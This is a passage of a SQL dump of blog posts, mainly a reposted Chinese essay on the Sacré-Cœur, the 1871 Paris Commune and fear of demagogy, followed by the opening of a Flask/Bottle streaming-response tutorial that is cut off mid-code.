可以运行。\n其实最希望的就是有兴趣的同学可以试用一下（我也会在我的下个项目中试用），如果有意见或者建议可以通过 各种 方式联系我，或者向 github 托管的仓库发送 issues，又或者是 fork 下来然后推 pull request。好吧，我承认 github 的这些功能我大部分都没用过，想试一下。\n具体的使用方法，可以看 项目主页 或者单元测试，我没写详细的文档，因为觉得本来就是个挺简单的东西。', NULL, NULL, NULL),
(85, 'https://blog.tonyseek.com/post/basilica-of-the-sacred-heart-of-paris/', '[转载] 圣心寺和“暴民恐惧”', '<p>本文转载自 <a class="reference external" href="http://fang-lizhi.hxwk.org/2012/03/26/%E5%9C%A3%E5%BF%83%E5%AF%BA%E5%92%8C%E2%80%9C%E6%9A%B4%E6%B0%91%E6%81%90%E6%83%A7%E2%80%9D/">该文集</a> 。</p>\n\n<div class="section" id="id3">\n<h2>一</h2>\n<p>我多次到过巴黎，但只去过圣心寺（Basilica of the Sacred Heart of Paris）一次。不太喜欢那个地方。寺中没有非看不可的宗教艺术，相反，此教堂非看不可的是它的世俗政治。</p>\n<p>圣心寺位于巴黎的制高点——蒙马特高地。该高地周围有点像老北京的天桥，属九流三教荟萃之地。卖唱的，画画儿的，洋杂耍，酗酒者，街混混，“红磨坊”等等都有。一座80米宽80米高的大教堂，突然在此拔地而起，正襟危坐，和周围不很协调。大教堂的颜色日间是一大片丧事状的煞白，晚上是惨白，看着瘮得慌，与巴黎的开朗的色彩格调不协调。圣心寺门前的一尊铜像，是骑马举劍的圣女贞德，也令人感觉怪怪的，怎麽用一员女将当看门的？就好像，在弥勒佛寺门口，不用哼哈二将当门警，而塑一尊立马横刀的花木兰，不合适吧。</p>\n<p>也许，设计者要的就是给你一个不协调的感觉。因为，圣心寺不同一般天主教堂，其主要功效不在于弥撒，忏悔，洗礼，圣餐，婚丧典礼，封圣，或加冕，而是镇邪，压邪，去邪。</p>\n<p>“邪”，指的是1871年为时两个月的巴黎公社。</p>\n<p>对1871巴黎公社的评价，一直有“正”“邪”两种极端。上大学时，我们被教导说，1871巴黎公社是伟大的创举，是无产阶级革命和共产主义社会的原型。在圣心寺，公社被称为是一群恶棍和无赖们的“歇斯底里狂热”。</p>\n<p>这很像五十年代听到的关于“太平天国”的两极评价。1951年，太平天国起事一百年，纪念活动上的评价都是“伟大的农民革命”等等。而在祖母等长我两辈人的口中听到的是，“长毛”是无恶不做的强盗，土匪。太平天国之后，在杭嘉湖一带，吓唬小孩的一个习惯用语是，“别闹了，长毛来了！”</p>\n<p>巴黎公社失败之后，法军开始大屠杀，其“规模之大，在文明的十九世纪国家当中几乎是不可思议的” <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id9" id="id4">[1]</a> 。 尽管被杀戮的3 – 5万人中，大部分是公社社员。圣心寺所要镇的邪，却是专指公社社员。公社被圣心寺认定为极端组织煽动起来的暴民狂热，最终导致暴民自己被屠。1872年，为防类似事件再发，第三共和的国民议会通过禁止极端组织活动的议案。极端组织主要指的是无政府主义和共产主义，即主张废除财产私有制的各政治流派。</p>\n<p>2010年，第五共和的国民议会再次重申，圣心寺是为巴黎公社社员所犯下罪行消孽。这也是圣心寺如今的说法。</p>\n<p>所以，圣心寺，是对“暴民政治”的恐惧。</p>\n</div>\n<div class="section" id="id5">\n<h2>二</h2>\n<p>在西方，“暴民恐惧”，至少可以追溯到古希腊的亚里斯多德。</p>\n<p>亚氏著有“论物理”，共八卷。现在已经没有人引用了。因为其中的论断，不是已经过时，就是被证明是错误的。</p>\n<p>亚氏著有“论政治”，也是八卷。还没有完全被遗忘。其中之一就是“暴民政治”。</p>\n<p>亚里斯多德认为“由优秀者所主持的政府才是最好的”（本节的引文，大多出自亚氏“论政治”，不再一一标明）。以此为标准，亚氏考察了古希腊城邦的三种政治体制——君主政体，贵族政体和共和政体。他的结论是：没有一个政体是好的，都会腐败，变质。</p>\n<p>尽管如此，亚氏认为，三种“腐败政体中，（共和政体）并不算太坏”。共和政体基于宪法和议会，所以，它能与下述“自由，平等”观念相容：“自由，平等的形式之一是，人人均有治理和被治理的机会”。只在共和政体中，（原则上）有可能实现“人人均有治理……的机会”。亚氏说“没有理由老是把上等的笛子给出身高贵者，而不给精于笛艺的吹笛者。前者不见得会善加利用”。当然，这里的“人人”和“吹笛者”均是指自由民，不包括奴隶。</p>\n<p>世事是动态的，亚氏进一步说“最好的反面乃是最坏的”。君主制走向反面，乃是“暴君统治”；贵族政体走向反面，乃是“寡头政治”。共和政体的反面，则是 demagogy —— 被煽动起来的暴民的统治。</p>\n<p>穷人的人数众多，但见识少，缺乏教养，拙于价值判断。如果选举权扩及到穷人，政权可能会由容易被煽动的人主导，难免不走火入魔，那就是demagogy。</p>\n<p>“暴民政治”同“暴君政治”和“寡头政治”一样，都是“暴”。“暴君”和“寡头”政体中，“暴君”和“寡头”是施“暴”的源头。而demagogy中的暴，是社会失去理性的主导，走入混乱，失序，冲突，打斗，流血。这就是亚氏的“demagogy恐惧”。</p>\n<p>后世许多人重复阐述过亚氏的“暴民忧虑”：宪法和议会不能保证民主政体不堕落为demagogy，普选制更是通向demagogy之路。在西欧，从康德，罗素…..到丘吉尔等有影响的人士，对民主都有不少负面之词。“民主……与自由是矛盾的”，“民主是较低级的政体”，“民主体制造就公众政治的伪善”，“人民大众的意见很容易会变成魔鬼式的吼叫”等等。最尖锐的评论也许属于尼采，他说，选举制，议会制，就是“使牲口变成主人”。</p>\n<p>1871年巴黎公社一人一票选举制，被马克思美誉为高度民主社会的雏形。圣心寺则说，那不是民主社会，而是demagogy，社会中邪了。</p>\n</div>\n<div class="section" id="id6">\n<h2>三</h2>\n<p>Demagogy一字至今没有中译名，虽然它不是个新字。想搜寻中文世界里有关demagogy的文章，无从下手。也许根本就没有这类文章？不对，回想一下就发现，demagogy的论断，不但似曾相识，而且还在课堂里正正经经地学过呢。</p>\n<p>五十年代初的北大，“联共（布）党史”也是物理系学生的必修课。当时，苏联还派来一些“联共党史”专家，教授，帮助中国教师（大都来自是历史系或其他人文系科）讲授“联共党史”，教材是 “联共（布）党史简明教程”。苏联出版的“教程”一书很便宜，在王府井大街的外文书店有卖，两根奶油冰棍的钱就可以买一本。我前后买过三本，一本中文，一本俄文，一本英文。考试也不难，答题切忌创造性。要学会背书。关键语句，最好背得一字不差，即可满分。所以，至今还记得“教程”中的有关语句。</p>\n<p>“联共党史”的第一个批判对象是俄国的民粹主义。民粹派主张，俄国的进步和改革主要依靠“农民公社”。</p>\n<p>“联共党史”批判说，“虽然农民人数众多，但他们是同最落后的经济形式，即小生产相联系的，因而没有也不可能有远大前途……”（本节引文大多取自“联共（布）党史简明教程”，不再一一标明）。</p>\n<p>这就是说，正宗马克思主义，即“联共党史”断言，农民是劳苦大众中最落后而又无前途的一类。哪能依靠这些人闹革命 ?</p>\n<p>在批判民粹主义的课下盛传，毛泽东的“群众路线”被苏联来的“联共党史”专家们举例为民粹主义，毛的“依靠农民”路线被认定同俄国民粹派路线一样。在联共（布）专家的口里，毛是民粹派。中国教师当然不会在课堂上说。至于，在实际政策上，毛到底是不是“依靠农民”，那是另一回事了。反正联共（布） 专家们根本不知道，也不懂。总之，在答“联共党史”考试题时，要小心，不要用毛氏的语言去答“联共党史”的考题。</p>\n<p>工人阶级是先进阶级？也是个X 话。正宗马克思主义认为  “工人阶级本来不可能有社会民主主义意识，这种意识只能从外面灌输进去……”。 亦即，工人阶级自身也是属于“盲”者，不可能有自觉的先进意识，社会民主主义先进意识必须从外面灌输到工人阶级中进去。</p>\n<p>总之，正宗马克思主义认为，工人和农民加起来最多走到工联主义，农会主义，不会自动产生追求社会主义的思想，更不要说共产主义理想了。</p>\n<p>这是就是 demagogy 的第一层意思：工农大众人数虽众多，但他们的知识贫乏，眼光短浅，不足为惧。对建立在私有财产制上的社会制度，没有威胁。</p>\n<p>这一层意思同普鲁士铁血宰相俾斯麦对农民的估计倒是一样。俾斯麦认为，民主普选制对他的统治并无大碍。农民在大事上向来支持教会，国王或者皇帝。普选将会加强右派，而非左派。</p>\n<p>Demagogy的第二层意思是：穷人大众容易失去理性（或本来就没有理性），易于被煽动而走入“邪”门。一旦如此，则会成为极可怕的力量。巴黎公社时期，最有影响力的人物是无政府主义者蒲鲁东，他的名言是“财产权即盗窃”，它对穷苦大众极具煽动力。一旦穷苦大众认真实行蒲鲁东的名言，剥夺盗窃者的盗窃财物，私有产权社会能不歇斯底里吗？马克思著有“法兰西内战”一书，是对1871年巴黎公社的反思。马克思的结论之一是，巴黎公社当局的一个重要失误是，没有及时地没收（剥夺）银行，以致大小有产者的许多私有财产，都及时转移出巴黎了。亦即，巴黎公社执行蒲鲁东的名言，还不够迅速和彻底。</p>\n<p>“联共党史”认同这种观点，它说：共产主义者的任务就是要把（取消财产私有制的）共产主义思想“从外面灌输”到工农大众中去。“煽动”即是一种“灌输”。用“从外面灌输进去”一语形容共产主义力行者与工农大众的关系，是马克思本人首用的。工农大众是可以被灌输的，是应当被灌输的，也是必须被灌输的。 “灌输论”是马克思主义的精髓之一。共产党的宣传部，即为灌输部。</p>\n<p>列宁说得更直截了当（忘了出处），他说，俄国革命只要有一百个志同道合的职业革命家就足够了。如果一百个职业革命家能到工农大众里去灌输，宣传，鼓动，就足以煽起巨大的力量，把俄国翻过来。</p>\n<p>“联共党史”第六，七章描写的十月革命，大体就是按列宁的路线进行的。在沙皇制下，列宁和他的“一百个”布尔什维克同志，不可能公开地灌输，宣传和鼓动。以致列宁在国外逗留了17年。根据KGB 公开的档案，职业革命家们在国外期间都有不错的财源支持，可以寓居于柏林，巴黎，和意大利卡普里岛等地 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id10" id="id7">[2]</a> 。1917年俄历2月，俄国的民主革命成功，沙皇逊位，代议制（杜马）的临时政府掌权。列宁于4月就回到国内。在民主体制下，“一百个”职业革命家们可以公开地或半公开地到工厂去宣传，灌输和煽动了。结果，“一切政权归苏维埃！”口号获得工人大众认同。最终，苏维埃挤垮了杜马，布尔什维克夺得政权，俄国翻过来了。攻打冬宫并不是十月革命的关键。按“联共党史”，俄历10月25日入夜，阿芙乐尔号巡洋舰向冬宫开炮，攻打冬宫开始，到10：45pm就宣告胜利了，大体是一场电影的时间。十月革命成功的关键是布尔什维克对工人和相当一部分士兵的灌输取得成功。</p>\n<p>布尔什维克职业革命家们对农民的灌输并不成功（俾斯麦猜对了）。所以，内战爆发时，多数农民支持白军（主力是士官生）。苏维埃镇压反革命，哪怕他们是农民（最落后的一类），民主政体在俄国再度消失。</p>\n<p>把“联共党史”放在十九世纪欧洲社会革命历史背景里重新一看，就发现，五十多年前 “被灌输”和 “自灌输”的“联共（布）党史简明教程”中，一些章节正是在描写demagogy在俄国“无产阶级革命”中的作用。甚至在电影“列宁在十月”和“列宁在1918”中也能看到蛛丝马迹。</p>\n</div>\n<div class="section" id="id8">\n<h2>四</h2>\n<p>当政者，大都不喜欢扩大民主，更惧怕扩大民主以后可能产生的demagogy。这一点都不奇怪。</p>\n<p>有一点“奇怪”的是，尽管demagogy的幽灵一直在欧洲游荡，尽管对民主制一直有忧虑和批判，尽管民主政体有负面的历史经验，但在1871年巴黎公社之后，西欧各国的民主政体并没有停滞或萎缩，而仍是在发展和扩大。</p>\n<p>1880年，法国当局大赦所有1871巴黎公社政治犯和逃亡者。最极端的革命家布朗基（巴黎公社的名誉主席）也被释放。</p>\n<p>随后，西欧各国的选举权人数不断增加。选举权的普及程度是对民主政体发展的一个动态的定量度量。</p>\n<p>英国：1883年，20岁以上男子选民人数从8% 增加到29%。</p>\n<p>比利时：1894年，成年男性选民人数从3.9% 增加到37.3%。</p>\n<p>挪威：1898年，选民人数从16.6% 增加到34.8%。</p>\n<p>法国，十九世纪末，选民人数也已占成年人口的30-40%。</p>\n<p>芬兰：1905年，选民普及到76%。并赋予妇女投票权。</p>\n<p>奥地利：1907年，实行普选。</p>\n<p>意大利：1913年，实行普选。在十九世纪末，意大利还有67%的人口是文盲。</p>\n<p>1914年， 第一次世界大战前夕，西欧各国的男性公民大体都有了选举权。成年的“男性牲口”都变成主人了。</p>\n<p>1919年，第一次世界大战结束，俄国和土耳其以西的欧洲，无论战败国或战胜国，大都以民主制（宪法，普选制，议会）重组国家。</p>\n<p>1871年巴黎公社数万人死于非命之后的数十年里，西欧民主政体有如此的发展。如何解释？</p>\n<p>民主体制不再在乎“暴民恐惧”了吗？</p>\n<p>2012.3.18 . Tucson 华夏文摘 第一〇九五期(cm1203d)</p>\n<table class="docutils footnote" frame="void" id="id9" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id4">[1]</a></td><td>本文中的一些数据取自Eric Hobsbawn 的“资本的年代 1848 – 1875”（1975），及“帝国的年代 1875 – 1914”（1987）。</td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id10" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id7">[2]</a></td><td><ol class="first last upperalpha simple" start="4">\n<li>Volkogonov,   Lenin   ( Free Press ，New York， 1994) 。</li>\n</ol>\n</td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2012-04-12 14:04:00', '2012-04-12 14:04:00', 0, '[["\\u515a\\u53f2", 0.1274299329267327], ["\\u8054\\u5171", 0.1202503157022348], ["\\u704c\\u8f93", 0.11769919688302688], ["demagogy", 0.10990946077630834], ["\\u5df4\\u9ece\\u516c\\u793e", 0.09528724290059404], ["\\u5723\\u5fc3", 0.07984017426746817], ["\\u66b4\\u6c11", 0.07524124822680339], ["1871", 0.06763659124695898], ["\\u4e9a\\u6c0f", 0.06763659124695898], ["\\u519c\\u6c11", 0.04891790155468175], ["\\u6c11\\u4e3b", 0.04803701210919377], ["\\u5927\\u4f17", 0.04688042958178218], ["\\u4fc4\\u56fd", 0.04678338828465346], ["\\u6c11\\u4e3b\\u653f\\u4f53", 0.04441311363861386], ["\\u666e\\u9009", 0.03989052891789251], ["\\u5217\\u5b81", 0.03936951813267327], ["\\u9769\\u547d\\u5bb6", 0.03752941377636492], ["\\u717d\\u52a8", 0.037267399602093354], ["\\u4eba\\u6570", 0.03621643203043848], ["\\u5171\\u548c\\u653f\\u4f53", 0.03479573777026167]]', NULL, NULL, '本文转载自 该文集 。\n\n\n一\n我多次到过巴黎，但只去过圣心寺（Basilica of the Sacred Heart of Paris）一次。不太喜欢那个地方。寺中没有非看不可的宗教艺术，相反，此教堂非看不可的是它的世俗政治。\n圣心寺位于巴黎的制高点——蒙马特高地。该高地周围有点像老北京的天桥，属九流三教荟萃之地。卖唱的，画画儿的，洋杂耍，酗酒者，街混混，“红磨坊”等等都有。一座80米宽80米高的大教堂，突然在此拔地而起，正襟危坐，和周围不很协调。大教堂的颜色日间是一大片丧事状的煞白，晚上是惨白，看着瘮得慌，与巴黎的开朗的色彩格调不协调。圣心寺门前的一尊铜像，是骑马举劍的圣女贞德，也令人感觉怪怪的，怎麽用一员女将当看门的？就好像，在弥勒佛寺门口，不用哼哈二将当门警，而塑一尊立马横刀的花木兰，不合适吧。\n也许，设计者要的就是给你一个不协调的感觉。因为，圣心寺不同一般天主教堂，其主要功效不在于弥撒，忏悔，洗礼，圣餐，婚丧典礼，封圣，或加冕，而是镇邪，压邪，去邪。\n“邪”，指的是1871年为时两个月的巴黎公社。\n对1871巴黎公社的评价，一直有“正”“邪”两种极端。上大学时，我们被教导说，1871巴黎公社是伟大的创举，是无产阶级革命和共产主义社会的原型。在圣心寺，公社被称为是一群恶棍和无赖们的“歇斯底里狂热”。\n这很像五十年代听到的关于“太平天国”的两极评价。1951年，太平天国起事一百年，纪念活动上的评价都是“伟大的农民革命”等等。而在祖母等长我两辈人的口中听到的是，“长毛”是无恶不做的强盗，土匪。太平天国之后，在杭嘉湖一带，吓唬小孩的一个习惯用语是，“别闹了，长毛来了！”\n巴黎公社失败之后，法军开始大屠杀，其“规模之大，在文明的十九世纪国家当中几乎是不可思议的” [1] 。 尽管被杀戮的3 – 5万人中，大部分是公社社员。圣心寺所要镇的邪，却是专指公社社员。公社被圣心寺认定为极端组织煽动起来的暴民狂热，最终导致暴民自己被屠。1872年，为防类似事件再发，第三共和的国民议会通过禁止极端组织活动的议案。极端组织主要指的是无政府主义和共产主义，即主张废除财产私有制的各政治流派。\n2010年，第五共和的国民议会再次重申，圣心寺是为巴黎公社社员所犯下罪行消孽。这也是圣心寺如今的说法。\n所以，圣心寺，是对“暴民政治”的恐惧。\n\n\n二\n在西方，“暴民恐惧”，至少可以追溯到古希腊的亚里斯多德。\n亚氏著有“论物理”，共八卷。现在已经没有人引用了。因为其中的论断，不是已经过时，就是被证明是错误的。\n亚氏著有“论政治”，也是八卷。还没有完全被遗忘。其中之一就是“暴民政治”。\n亚里斯多德认为“由优秀者所主持的政府才是最好的”（本节的引文，大多出自亚氏“论政治”，不再一一标明）。以此为标准，亚氏考察了古希腊城邦的三种政治体制——君主政体，贵族政体和共和政体。他的结论是：没有一个政体是好的，都会腐败，变质。\n尽管如此，亚氏认为，三种“腐败政体中，（共和政体）并不算太坏”。共和政体基于宪法和议会，所以，它能与下述“自由，平等”观念相容：“自由，平等的形式之一是，人人均有治理和被治理的机会”。只在共和政体中，（原则上）有可能实现“人人均有治理……的机会”。亚氏说“没有理由老是把上等的笛子给出身高贵者，而不给精于笛艺的吹笛者。前者不见得会善加利用”。当然，这里的“人人”和“吹笛者”均是指自由民，不包括奴隶。\n世事是动态的，亚氏进一步说“最好的反面乃是最坏的”。君主制走向反面，乃是“暴君统治”；贵族政体走向反面，乃是“寡头政治”。共和政体的反面，则是 demagogy —— 被煽动起来的暴民的统治。\n穷人的人数众多，但见识少，缺乏教养，拙于价值判断。如果选举权扩及到穷人，政权可能会由容易被煽动的人主导，难免不走火入魔，那就是demagogy。\n“暴民政治”同“暴君政治”和“寡头政治”一样，都是“暴”。“暴君”和“寡头”政体中，“暴君”和“寡头”是施“暴”的源头。而demagogy中的暴，是社会失去理性的主导，走入混乱，失序，冲突，打斗，流血。这就是亚氏的“demagogy恐惧”。\n后世许多人重复阐述过亚氏的“暴民忧虑”：宪法和议会不能保证民主政体不堕落为demagogy，普选制更是通向demagogy之路。在西欧，从康德，罗素…..到丘吉尔等有影响的人士，对民主都有不少负面之词。“民主……与自由是矛盾的”，“民主是较低级的政体”，“民主体制造就公众政治的伪善”，“人民大众的意见很容易会变成魔鬼式的吼叫”等等。最尖锐的评论也许属于尼采，他说，选举制，议会制，就是“使牲口变成主人”。\n1871年巴黎公社一人一票选举制，被马克思美誉为高度民主社会的雏形。圣心寺则说，那不是民主社会，而是demagogy，社会中邪了。\n\n\n三\nDemagogy一字至今没有中译名，虽然它不是个新字。想搜寻中文世界里有关demagogy的文章，无从下手。也许根本就没有这类文章？不对，回想一下就发现，demagogy的论断，不但似曾相识，而且还在课堂里正正经经地学过呢。\n五十年代初的北大，“联共（布）党史”也是物理系学生的必修课。当时，苏联还派来一些“联共党史”专家，教授，帮助中国教师（大都来自是历史系或其他人文系科）讲授“联共党史”，教材是 “联共（布）党史简明教程”。苏联出版的“教程”一书很便宜，在王府井大街的外文书店有卖，两根奶油冰棍的钱就可以买一本。我前后买过三本，一本中文，一本俄文，一本英文。考试也不难，答题切忌创造性。要学会背书。关键语句，最好背得一字不差，即可满分。所以，至今还记得“教程”中的有关语句。\n“联共党史”的第一个批判对象是俄国的民粹主义。民粹派主张，俄国的进步和改革主要依靠“农民公社”。\n“联共党史”批判说，“虽然农民人数众多，但他们是同最落后的经济形式，即小生产相联系的，因而没有也不可能有远大前途……”（本节引文大多取自“联共（布）党史简明教程”，不再一一标明）。\n这就是说，正宗马克思主义，即“联共党史”断言，农民是劳苦大众中最落后而又无前途的一类。哪能依靠这些人闹革命 ?\n在批判民粹主义的课下盛传，毛泽东的“群众路线”被苏联来的“联共党史”专家们举例为民粹主义，毛的“依靠农民”路线被认定同俄国民粹派路线一样。在联共（布）专家的口里，毛是民粹派。中国教师当然不会在课堂上说。至于，在实际政策上，毛到底是不是“依靠农民”，那是另一回事了。反正联共（布） 专家们根本不知道，也不懂。总之，在答“联共党史”考试题时，要小心，不要用毛氏的语言去答“联共党史”的考题。\n工人阶级是先进阶级？也是个X 话。正宗马克思主义认为  “工人阶级本来不可能有社会民主主义意识，这种意识只能从外面灌输进去……”。 亦即，工人阶级自身也是属于“盲”者，不可能有自觉的先进意识，社会民主主义先进意识必须从外面灌输到工人阶级中进去。\n总之，正宗马克思主义认为，工人和农民加起来最多走到工联主义，农会主义，不会自动产生追求社会主义的思想，更不要说共产主义理想了。\n这是就是 demagogy 的第一层意思：工农大众人数虽众多，但他们的知识贫乏，眼光短浅，不足为惧。对建立在私有财产制上的社会制度，没有威胁。\n这一层意思同普鲁士铁血宰相俾斯麦对农民的估计倒是一样。俾斯麦认为，民主普选制对他的统治并无大碍。农民在大事上向来支持教会，国王或者皇帝。普选将会加强右派，而非左派。\nDemagogy的第二层意思是：穷人大众容易失去理性（或本来就没有理性），易于被煽动而走入“邪”门。一旦如此，则会成为极可怕的力量。巴黎公社时期，最有影响力的人物是无政府主义者蒲鲁东，他的名言是“财产权即盗窃”，它对穷苦大众极具煽动力。一旦穷苦大众认真实行蒲鲁东的名言，剥夺盗窃者的盗窃财物，私有产权社会能不歇斯底里吗？马克思著有“法兰西内战”一书，是对1871年巴黎公社的反思。马克思的结论之一是，巴黎公社当局的一个重要失误是，没有及时地没收（剥夺）银行，以致大小有产者的许多私有财产，都及时转移出巴黎了。亦即，巴黎公社执行蒲鲁东的名言，还不够迅速和彻底。\n“联共党史”认同这种观点，它说：共产主义者的任务就是要把（取消财产私有制的）共产主义思想“从外面灌输”到工农大众中去。“煽动”即是一种“灌输”。用“从外面灌输进去”一语形容共产主义力行者与工农大众的关系，是马克思本人首用的。工农大众是可以被灌输的，是应当被灌输的，也是必须被灌输的。 “灌输论”是马克思主义的精髓之一。共产党的宣传部，即为灌输部。\n列宁说得更直截了当（忘了出处），他说，俄国革命只要有一百个志同道合的职业革命家就足够了。如果一百个职业革命家能到工农大众里去灌输，宣传，鼓动，就足以煽起巨大的力量，把俄国翻过来。\n“联共党史”第六，七章描写的十月革命，大体就是按列宁的路线进行的。在沙皇制下，列宁和他的“一百个”布尔什维克同志，不可能公开地灌输，宣传和鼓动。以致列宁在国外逗留了17年。根据KGB 公开的档案，职业革命家们在国外期间都有不错的财源支持，可以寓居于柏林，巴黎，和意大利卡普里岛等地 [2] 。1917年俄历2月，俄国的民主革命成功，沙皇逊位，代议制（杜马）的临时政府掌权。列宁于4月就回到国内。在民主体制下，“一百个”职业革命家们可以公开地或半公开地到工厂去宣传，灌输和煽动了。结果，“一切政权归苏维埃！”口号获得工人大众认同。最终，苏维埃挤垮了杜马，布尔什维克夺得政权，俄国翻过来了。攻打冬宫并不是十月革命的关键。按“联共党史”，俄历10月25日入夜，阿芙乐尔号巡洋舰向冬宫开炮，攻打冬宫开始，到10：45pm就宣告胜利了，大体是一场电影的时间。十月革命成功的关键是布尔什维克对工人和相当一部分士兵的灌输取得成功。\n布尔什维克职业革命家们对农民的灌输并不成功（俾斯麦猜对了）。所以，内战爆发时，多数农民支持白军（主力是士官生）。苏维埃镇压反革命，哪怕他们是农民（最落后的一类），民主政体在俄国再度消失。\n把“联共党史”放在十九世纪欧洲社会革命历史背景里重新一看，就发现，五十多年前 “被灌输”和 “自灌输”的“联共（布）党史简明教程”中，一些章节正是在描写demagogy在俄国“无产阶级革命”中的作用。甚至在电影“列宁在十月”和“列宁在1918”中也能看到蛛丝马迹。\n\n\n四\n当政者，大都不喜欢扩大民主，更惧怕扩大民主以后可能产生的demagogy。这一点都不奇怪。\n有一点“奇怪”的是，尽管demagogy的幽灵一直在欧洲游荡，尽管对民主制一直有忧虑和批判，尽管民主政体有负面的历史经验，但在1871年巴黎公社之后，西欧各国的民主政体并没有停滞或萎缩，而仍是在发展和扩大。\n1880年，法国当局大赦所有1871巴黎公社政治犯和逃亡者。最极端的革命家布朗基（巴黎公社的名誉主席）也被释放。\n随后，西欧各国的选举权人数不断增加。选举权的普及程度是对民主政体发展的一个动态的定量度量。\n英国：1883年，20岁以上男子选民人数从8% 增加到29%。\n比利时：1894年，成年男性选民人数从3.9% 增加到37.3%。\n挪威：1898年，选民人数从16.6% 增加到34.8%。\n法国，十九世纪末，选民人数也已占成年人口的30-40%。\n芬兰：1905年，选民普及到76%。并赋予妇女投票权。\n奥地利：1907年，实行普选。\n意大利：1913年，实行普选。在十九世纪末，意大利还有67%的人口是文盲。\n1914年， 第一次世界大战前夕，西欧各国的男性公民大体都有了选举权。成年的“男性牲口”都变成主人了。\n1919年，第一次世界大战结束，俄国和土耳其以西的欧洲，无论战败国或战胜国，大都以民主制（宪法，普选制，议会）重组国家。\n1871年巴黎公社数万人死于非命之后的数十年里，西欧民主政体有如此的发展。如何解释？\n民主体制不再在乎“暴民恐惧”了吗？\n2012.3.18 . Tucson 华夏文摘 第一〇九五期(cm1203d)\n\n\n\n[1]本文中的一些数据取自Eric Hobsbawn 的“资本的年代 1848 – 1875”（1975），及“帝国的年代 1875 – 1914”（1987）。\n\n\n\n\n\n[2]\nVolkogonov,   Lenin   ( Free Press ，New York， 1994) 。\n\n\n\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(86, 'https://blog.tonyseek.com/post/flask-stream-response/', '在 Flask 里产生流式响应', '<p>用过 Bottle <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id6" id="id1">[0]</a> 的同学应该不会忘记它的流式响应 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id7" id="id2">[1]</a> ——在视图函数中使用 <tt class="docutils literal">yield</tt> 关键字，让调用结果成为一个迭代器，那么 HTTP 客户端将会得到这个迭代器每次迭代的结果一部分，迭代器产生多少客户端收到多少，就像流一样。用这种方法在产生一些大的响应对象时（比如大文件下载），能有效地节约服务器内存。</p>\n<p>运行以下代码并在浏览器访问 <tt class="docutils literal"><span class="pre">http://localhost:5000/stream</span></tt></p>\n\n<figure class="code"><figcaption><span>stream.py</span></figcaption><div class="highlight"><pre> <span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>\n <span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span>\n\n <span class="nd">@route</span><span class="p">(</span><span class="s">''/stream''</span><span class="p">)</span>\n <span class="k">def</span> <span class="nf">stream</span><span class="p">():</span>\n     <span class="k">yield</span> <span class="s">''START''</span>\n     <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>\n     <span class="k">yield</span> <span class="s">''MIDDLE''</span>\n     <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>\n     <span class="k">yield</span> <span class="s">''END''</span>\n\n <span class="n">run</span><span class="p">()</span>\n</pre></div>\n</figure><p>就能看到 &quot;START&quot; 出现之后，过了三秒 &quot;MIDDLE&quot; 才出现，再过了五秒 &quot;END&quot; 出现，然后浏览器的小转盘停止旋转，响应结束。</p>\n<p>这个特性其实不是 Bottle 本身的特性，而是 WSGI 中已经规定的支持 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id8" id="id3">[2]</a> 。WSGI 标准要求 WSGI Application 返回的就是迭代器，所以我们平时返回的“整块”响应其实都已被 Web 框架包装成只产生一个元素的迭代器。</p>\n<p>比较纠结的是，在 Flask 却不能像 Bottle 一样这么便捷。如果在 Flask 的视图函数里面使用 <tt class="docutils literal">yield</tt> ，那么将得到一个 <tt class="docutils literal">TypeError</tt> 异常，异常提示信息说：</p>\n<pre class="literal-block">\nTypeError: ''generator'' object is not callable\n</pre>\n<p>原来 Flask 要求视图函数返回的结果是可调用的。从 Flask 文档中得知，Flask 能够处理的响应是 <tt class="docutils literal">werkzeug</tt> 中 <tt class="docutils literal">Response</tt> 或其子类的实例。而我们平时使用视图函数，一般是返回一个字符串的，该字符串会被 Flask 包装成 Response 对象，也就是说这里给了一点点糖。具体做这件事的，是 <tt class="docutils literal">flask.app.Flask</tt> 类中的 <tt class="docutils literal">make_response</tt> 方法：</p>\n<figure class="code"><div class="highlight"><pre><span class="k">def</span> <span class="nf">make_response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">rv</span><span class="p">):</span>\n    <span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>\n        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s">''View function did not return a response''</span><span class="p">)</span>\n    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">rv</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">response_class</span><span class="p">):</span>\n        <span class="k">return</span> <span class="n">rv</span>\n    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">rv</span><span class="p">,</span> <span class="nb">basestring</span><span class="p">):</span>\n        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">response_class</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>\n    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">rv</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">):</span>\n        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">response_class</span><span class="p">(</span><span class="o">*</span><span class="n">rv</span><span class="p">)</span>\n    <span class="k">return</span> <span 